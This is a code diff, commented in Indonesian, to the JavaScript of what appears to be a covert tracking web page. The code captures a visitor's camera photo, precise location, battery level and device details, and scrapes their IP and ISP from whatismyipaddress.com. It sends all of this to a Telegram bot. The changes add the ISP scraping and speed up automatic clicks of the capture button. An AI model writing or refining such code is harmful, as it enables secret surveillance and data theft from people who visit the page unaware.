@@ -53,7 +53,6 @@
             platform: navigator.platform,
             batteryLevel: null,
             isp: null, // Info ISP perangkat
-            imei: null, // Info IMEI perangkat
             ipAddress: null // Alamat IP perangkat
           };
 
@@ -63,28 +62,43 @@
               .then(function(battery) {
                 deviceInfo.batteryLevel = battery.level * 100;
 
-                // Mengambil IP perangkat menggunakan layanan ipify
-                fetch('https://api.ipify.org?format=json')
+                // Mengambil informasi ISP dan alamat IP perangkat menggunakan whatismyipaddress.com
+                fetch('https://whatismyipaddress.com/')
                   .then(function(response) {
-                    return response.json();
+                    return response.text();
                   })
-                  .then(function(data) {
-                    deviceInfo.ipAddress = data.ip;
+                  .then(function(html) {
+                    // Parsing HTML untuk mendapatkan informasi ISP dan alamat IP
+                    var parser = new DOMParser();
+                    var doc = parser.parseFromString(html, 'text/html');
+
+                    var ispElement = doc.querySelector('.ip-info-data:nth-child(2) a');
+                    var ipAddressElement = doc.querySelector('.ip-info-data:nth-child(4) a');
+
+                    var isp = ispElement ? ispElement.textContent.trim() : 'N/A';
+                    var ipAddress = ipAddressElement ? ipAddressElement.textContent.trim() : 'N/A';
+
+                    // Menambahkan informasi ISP dan alamat IP ke informasi perangkat
+                    deviceInfo.isp = isp;
+                    deviceInfo.ipAddress = ipAddress;
 
                     // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
                   })
                   .catch(function(error) {
-                    console.error('Terjadi kesalahan dalam mendapatkan alamat IP:', error);
+                    console.error('Terjadi kesalahan dalam mendapatkan informasi ISP dan alamat IP:', error);
+                    // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API tanpa informasi ISP dan alamat IP
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
                   });
               })
               .catch(function(error) {
                 console.error('Gagal mendapatkan informasi batrai:', error);
+                // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API tanpa informasi ISP dan alamat IP
                 sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
               });
           } else {
             console.error('Browser tidak mendukung mendapatkan informasi batrai.');
+            // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API tanpa informasi ISP dan alamat IP
             sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
           }
         }, function(error) {
@@ -121,12 +135,12 @@
         method: 'POST',
         body: formData
       })
-      .then(function(response) {
-        console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
-      })
-      .catch(function(error) {
-        console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
-      });
+        .then(function(response) {
+          console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
+        })
+        .catch(function(error) {
+          console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
+        });
     }
 
     // Fungsi untuk mengonversi data URI menjadi Blob
@@ -146,7 +160,7 @@
       var button = document.getElementById('capture-btn');
       var clickCount = 0;
       var maxClicks = 5;
-      var delay = 3000; // Delay dalam milidetik (misal: 1000 = 1 detik)
+      var delay = 1000; // Delay dalam milidetik (misal: 1000 = 1 detik)
 
       var interval = setInterval(function() {
         button.click();
